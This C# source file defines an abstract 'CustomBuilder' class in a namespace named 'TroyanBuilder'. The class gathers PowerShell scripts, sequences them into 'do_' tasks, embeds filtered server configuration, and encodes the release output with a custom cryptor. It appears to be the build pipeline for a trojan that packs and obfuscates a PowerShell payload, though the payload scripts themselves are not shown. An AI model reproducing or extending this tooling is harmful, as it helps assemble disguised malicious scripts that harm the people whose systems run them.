using System.Diagnostics.CodeAnalysis;
using System.Text;
using System.Text.Json;
using System.Text.Json.Nodes;
using model;

namespace TroyanBuilder;

[SuppressMessage("ReSharper", "MemberCanBePrivate.Global")]
public abstract class CustomBuilder
{
    protected abstract string SourceDir {get;}
    
    protected abstract string OutputFile { get; }
    protected abstract string OutputReleaseFile { get; }
    protected abstract string OutputDebugFile { get; }
    protected abstract string[] PrioritySources { get; }
    protected string[] PriorityLinks => PrioritySources.Select(x =>$". ./{x}.ps1").ToArray();

    protected abstract string[] PriorityTasks { get; }
    protected abstract string[] UnpriorityTasks { get; }
    
    private ServerService Svc;
    protected ServerModel Model = new();
    private List<string> SourceFiles;
    private readonly StringBuilder Builder = new();
    protected readonly List<string> Result = new();
    
    public virtual List<string> Build(string server)
    {
        Svc = new ServerService();
        var srv = Svc.GetServer(server, true, true, server, "localhost");
        Model = srv.ServerModel!;
        MakeConsts();
        InternalBuild(server);
        SourceFiles = GetSourceFiles();
        CompileSources();
        var directoryPath = Path.GetDirectoryName(OutputReleaseFile);
        if (!string.IsNullOrEmpty(directoryPath) && !Directory.Exists(directoryPath))
            Directory.CreateDirectory(directoryPath);
        
        BuildDebug();
        BuildRelease();

        return Result;
    }
    
    private void MakeConsts()
    {
        var template = @"
$server = @'
_SERVER
'@ | ConvertFrom-Json
";

        var keywords = new List<string>
        {
            "Dir", "troyan", "dnSponsor", "ftp", "user", "alias",
            "login", "password", "ico", "domainController",
            "interfaces", "bux", "landing", "php", "domainIp"
        };

        var serverFilePath = Model.UserServerFile;
        var serverJson = File.ReadAllText(serverFilePath);
        var server = JsonNode.Parse(serverJson)!;

        JsonNode FilterObjectByKeywords(JsonNode serverObject, List<string> filterKeywords)
        {
            var filteredDictionary = serverObject.AsObject()
                .Where(kvp => !filterKeywords.Contains(kvp.Key, StringComparer.OrdinalIgnoreCase))
                .ToDictionary(kvp => kvp.Key, kvp => kvp.Value);

            return JsonNode.Parse(JsonSerializer.Serialize(filteredDictionary))!;
        }

        var filteredObject = FilterObjectByKeywords(server, keywords);
        var serverJsonString = JsonSerializer.Serialize(filteredObject, new JsonSerializerOptions { WriteIndented = true });
        template = template.Replace("_SERVER", serverJsonString);

        var outputPath = Path.Combine(Model.TroyanScriptDir, "consts_body.ps1");
        File.WriteAllText(outputPath, template);
    }


    private void BuildDebug()
    {
        var doo = BuildDo();
        var data = Builder.ToString();
        var dataDebug = data + Environment.NewLine + doo;
        File.WriteAllText(OutputDebugFile,dataDebug);
    }

    private void BuildRelease()
    {
        var doo = BuildDo();
        var doSplit = doo.Split(new[] { "\r\n", "\n" }, StringSplitOptions.None).Where(x => x.Contains("do_")).ToArray();
        doSplit = doSplit.Select(x => $"'{x}'").ToArray();
        doo = string.Join(',', doSplit);
        var dataProd = Builder.ToString();
        var programRaw = ReadSource("program");
        (var head, var body) = ExtractHeadAndBody(programRaw);
        body = body.Replace("###doo", doo);
        dataProd = head + Environment.NewLine + dataProd + Environment.NewLine + body;
        File.WriteAllText(OutputReleaseFile,dataProd);
        CustomCryptor.Encode(dataProd, OutputFile);
    }

    protected abstract void InternalBuild(string server);
    
    private void CompileSources()
    {
        foreach (var sourceFile in SourceFiles)
        {
            var data = ReadSource(sourceFile);
            Builder.Append(data);
            Builder.AppendLine();
        }
    }
    
    protected string PfxFile(string domain)
    {
        return Path.Combine(Model.CertDir, domain + ".pfx");
    }

    protected virtual List<string> GetSourceFiles()
    {
        var files =Directory.GetFiles(SourceDir)
            .Select(Path.GetFileNameWithoutExtension)
            .ToArray().Except(new[] { "program" }).ToList();
        var sortedArray = files.SortWithPriority(PrioritySources).ToList();
        return sortedArray;
    }

    private string ReadSource(string sourceFile)
    {
        var path = "";
        var dir = SourceDir;
        while (!File.Exists(path))
        {
            path = Path.Combine(dir, sourceFile + ".ps1");
            dir = Path.Combine(dir,"..");
        }
        var lines = File.ReadAllLines(path);
        var filteredLines = lines.Exclude(PriorityLinks);
        filteredLines = filteredLines.Exclude(SourceFiles.Select(a=> "do_" + a));
        
        var result = string.Join(Environment.NewLine, filteredLines);

        return result;
    }
    
    private string BuildDo()
    {
        var sourceFiles = SourceFiles
            .Except(PrioritySources)
            .Where(a=> !a.StartsWith("sub_"))
            .SortWithPriority(PriorityTasks, UnpriorityTasks).ToArray();
        var doBuilder = new StringBuilder();
        foreach (var sourceFile in sourceFiles)
        {
            var doX = $"do_{sourceFile}";
            doBuilder.AppendLine(doX);
        }
        return doBuilder.ToString();
    }
    
    
    static (string Head, string Body) ExtractHeadAndBody(string input)
    {
        var lines = input.Split(new[] { "\r\n", "\n" }, StringSplitOptions.None);

        var head = new StringBuilder();
        var body = new StringBuilder();

        var headBegin = false;
        var headEnd = false;

        foreach (var line in lines)
        {
            if (line.Trim() == "###head")
            {
                if (!headBegin)
                {
                    headBegin = true;
                }
                else
                {
                    if (!headEnd)
                    {
                        headEnd = true;
                    }
                }
            }

            if ( !headBegin || (headBegin && !headEnd))
            {
                head.AppendLine(line);
            }
            else
            {
                body.AppendLine(line);
            }
        }

        return (head.ToString().Trim(), body.ToString().Trim());
    }
}